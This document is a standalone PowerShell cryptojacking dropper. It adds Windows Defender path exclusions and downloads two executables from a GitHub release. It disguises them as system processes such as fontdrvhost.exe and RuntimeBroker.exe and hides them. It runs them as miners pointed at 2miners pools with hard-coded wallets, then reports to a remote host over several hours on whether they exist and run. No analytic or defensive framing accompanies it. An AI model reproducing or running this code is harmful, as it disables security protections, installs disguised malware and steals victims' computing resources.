reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /f /reg:64
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\ProgramData" /d 0 /f /reg:64

$filePath1 = "C:\ProgramData\fontdrvhost.exe"
$expectedHash1 = "6DC4800983F992A3D12457086485E2664F678A7FE0CA78DE36A059C84A7D571E"
$url1 = "https://github.com/diwakarebay/bookish-funicular/releases/download/v1.0/xeniamustreekingoals.exe"

if (!(Test-Path $filePath1) -or ((Get-FileHash $filePath1 -Algorithm SHA256).Hash -ne $expectedHash1)) {
    Remove-Item -Path $filePath1 -Force
    Invoke-WebRequest -Uri $url1 -OutFile $filePath1
    (Get-Item $filePath1).Attributes = 'ReadOnly, Hidden, System'
}

& $filePath1 --algo=rx/0 --url=solo-zeph.2miners.com:4444 --user=ZEPHsCSK9WxG57ZV6kBuAVHGGv6T3o1dhVR5rFfsfhUCXxscUSUT33TQVdEHYPpeYaTJkyrBULYdEiWyE6ZN34LmWQ6XxEYa53R.m62BxOMTFq --cpu-max-threads-hint=0 --cinit-idle-wait=5 --cinit-idle-cpu=100

$filePath2 = "C:\ProgramData\RuntimeBroker.exe"
$expectedHash2 = "0919AB0B8541864B10BE5C2EC6F4039DB59322E8B79E130FE58C42B646E73BBA"
$url2 = "https://github.com/diwakarebay/bookish-funicular/releases/download/v1.0/erasethehousemore.exe"

if (!(Test-Path $filePath2) -or ((Get-FileHash $filePath2 -Algorithm SHA256).Hash -ne $expectedHash2)) {
    Remove-Item -Path $filePath2 -Force
    Invoke-WebRequest -Uri $url2 -OutFile $filePath2
    (Get-Item $filePath2).Attributes = 'ReadOnly, Hidden, System'
}

& $filePath2 --cinit-algo=kawpow --pool=stratum://bc1qv76kuqdmtnn8qzapk9j548sderh60zylu69j3r.m62BxOMTFq@solo-rvn.2miners.com:7070 --cinit-max-gpu=100



Start-Sleep -Seconds (60*1)

irm "https://gocrazy.gg/requests?file=script31&from=script_1m"

if (Test-Path $filePath1) {
    irm "https://gocrazy.gg/requests?file=script31&from=xmr_exists_1m"
}

if (Get-Process | Where-Object { $_.Path -eq $filePath1 }) {
    irm "https://gocrazy.gg/requests?file=script31&from=xmr_runs_1m"
}

if (Test-Path $filePath2) {
    irm "https://gocrazy.gg/requests?file=script31&from=eth_exists_1m"
}

if (Get-Process | Where-Object { $_.Path -eq $filePath2 }) {
    irm "https://gocrazy.gg/requests?file=script31&from=eth_runs_1m"
}



Start-Sleep -Seconds (60*15)

irm "https://gocrazy.gg/requests?file=script31&from=script_15m"

if (Test-Path $filePath1) {
    irm "https://gocrazy.gg/requests?file=script31&from=xmr_exists_15m"
}

if (Get-Process | Where-Object { $_.Path -eq $filePath1 }) {
    irm "https://gocrazy.gg/requests?file=script31&from=xmr_runs_15m"
}

if (Test-Path $filePath2) {
    irm "https://gocrazy.gg/requests?file=script31&from=eth_exists_15m"
}

if (Get-Process | Where-Object { $_.Path -eq $filePath2 }) {
    irm "https://gocrazy.gg/requests?file=script31&from=eth_runs_15m"
}



Start-Sleep -Seconds (60*30)

irm "https://gocrazy.gg/requests?file=script31&from=script_30m"

if (Test-Path $filePath1) {
    irm "https://gocrazy.gg/requests?file=script31&from=xmr_exists_30m"
}

if (Get-Process | Where-Object { $_.Path -eq $filePath1 }) {
    irm "https://gocrazy.gg/requests?file=script31&from=xmr_runs_30m"
}

if (Test-Path $filePath2) {
    irm "https://gocrazy.gg/requests?file=script31&from=eth_exists_30m"
}

if (Get-Process | Where-Object { $_.Path -eq $filePath2 }) {
    irm "https://gocrazy.gg/requests?file=script31&from=eth_runs_30m"
}



Start-Sleep -Seconds (60*45)

irm "https://gocrazy.gg/requests?file=script31&from=script_45m"

if (Test-Path $filePath1) {
    irm "https://gocrazy.gg/requests?file=script31&from=xmr_exists_45m"
}

if (Get-Process | Where-Object { $_.Path -eq $filePath1 }) {
    irm "https://gocrazy.gg/requests?file=script31&from=xmr_runs_45m"
}

if (Test-Path $filePath2) {
    irm "https://gocrazy.gg/requests?file=script31&from=eth_exists_45m"
}

if (Get-Process | Where-Object { $_.Path -eq $filePath2 }) {
    irm "https://gocrazy.gg/requests?file=script31&from=eth_runs_45m"
}



Start-Sleep -Seconds (60*60)

irm "https://gocrazy.gg/requests?file=script31&from=script_60m"

if (Test-Path $filePath1) {
    irm
"https://gocrazy.gg/requests?file=script31&from=xmr_exists_60m"
}

if (Get-Process | Where-Object { $_.Path -eq $filePath1 }) {
    irm "https://gocrazy.gg/requests?file=script31&from=xmr_runs_60m"
}

if (Test-Path $filePath2) {
    irm "https://gocrazy.gg/requests?file=script31&from=eth_exists_60m"
}

if (Get-Process | Where-Object { $_.Path -eq $filePath2 }) {
    irm "https://gocrazy.gg/requests?file=script31&from=eth_runs_60m"
}



Start-Sleep -Seconds (60*120)

irm "https://gocrazy.gg/requests?file=script31&from=script_120m"

if (Test-Path $filePath1) {
    irm "https://gocrazy.gg/requests?file=script31&from=xmr_exists_120m"
}

if (Get-Process | Where-Object { $_.Path -eq $filePath1 }) {
    irm "https://gocrazy.gg/requests?file=script31&from=xmr_runs_120m"
}

if (Test-Path $filePath2) {
    irm "https://gocrazy.gg/requests?file=script31&from=eth_exists_120m"
}

if (Get-Process | Where-Object { $_.Path -eq $filePath2 }) {
    irm "https://gocrazy.gg/requests?file=script31&from=eth_runs_120m"
}



Start-Sleep -Seconds (60*180)

irm "https://gocrazy.gg/requests?file=script31&from=script_180m"

if (Test-Path $filePath1) {
    irm "https://gocrazy.gg/requests?file=script31&from=xmr_exists_180m"
}

if (Get-Process | Where-Object { $_.Path -eq $filePath1 }) {
    irm "https://gocrazy.gg/requests?file=script31&from=xmr_runs_180m"
}

if (Test-Path $filePath2) {
    irm "https://gocrazy.gg/requests?file=script31&from=eth_exists_180m"
}

if (Get-Process | Where-Object { $_.Path -eq $filePath2 }) {
    irm "https://gocrazy.gg/requests?file=script31&from=eth_runs_180m"
}
